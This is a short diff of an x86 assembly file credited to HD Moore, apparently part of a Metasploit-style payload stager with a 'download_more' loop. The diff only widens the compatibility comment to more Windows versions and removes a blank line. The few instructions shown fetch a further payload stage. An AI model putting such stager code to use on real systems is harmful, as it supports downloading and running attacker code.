@@ -1,6 +1,6 @@
 ;-----------------------------------------------------------------------------;
 ; Author: HD Moore
-; Compatible: Confirmed Windows 7, Windows XP, Windows 2000
+; Compatible: Confirmed Windows 7, Windows 2008 Server, Windows XP SP1, Windows SP3, Windows 2000
 ; Known Bugs: Incompatible with Windows NT 4.0, buggy on Windows XP Embedded (SP1)
 ; Version: 1.0
 ;-----------------------------------------------------------------------------;
@@ -150,7 +150,6 @@ download_more:
   call ebp
 
   test eax,eax           ; download failed? (optional?)
-
   jz failure
 
   mov eax, [edi]
